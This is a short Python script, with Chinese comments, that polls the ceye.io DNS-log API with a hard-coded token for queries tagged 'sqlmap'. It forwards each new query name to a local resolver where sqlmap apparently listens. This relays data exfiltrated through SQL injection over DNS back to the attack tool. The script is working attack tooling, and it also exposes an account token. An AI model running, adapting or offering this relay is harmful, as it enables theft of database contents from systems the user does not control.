# fa1lb2.ceye.io
# http://api.ceye.io/v1/records?token=b0a4cf0221c40d77d07ec6d93b32457e&type=dns&filter=sqlmap
import requests
import time
from socket import *
import dns.resolver


def listd(records, len1, len2):
    """将新增的dns查询拿出来"""
    len = len2 - len1
    l = []
    for i in range(0, len):
        l.append(records[i]["name"].lower())
    return l


my_resolver = dns.resolver.Resolver()
my_resolver.nameservers = ['127.0.0.1']
dnslog = requests.session()
url = "sqlmap.fa1lb2.ceye.io"
print(url)
len_a = []
# udpSocket = socket(AF_INET, SOCK_DGRAM)
while True:
    records = dnslog.get(url="http://api.ceye.io/v1/records?token=b0a4cf0221c40d77d07ec6d93b32457e&type=dns&filter=sqlmap").json()[
        "data"]
    len1 = len(len_a)
    len2 = len(records)
    if len1 != len2:
        sendlist = list(set(listd(records, len1, len2)))
        print(sendlist)
        """将新增的dns查询信息发送给sqlmap监听的udp 53"""
        sendAddr = ('127.0.0.1', 53)
        try:
            for i in sendlist:
                my_resolver.resolve(i, 'A')
                # udpSocket.sendto(bytes(i.encode('utf-8')), sendAddr)
        except:
            print("Please check udp://127.0.0.1:53!!!!!!")
        len_a = records
    else:
        time.sleep(3)
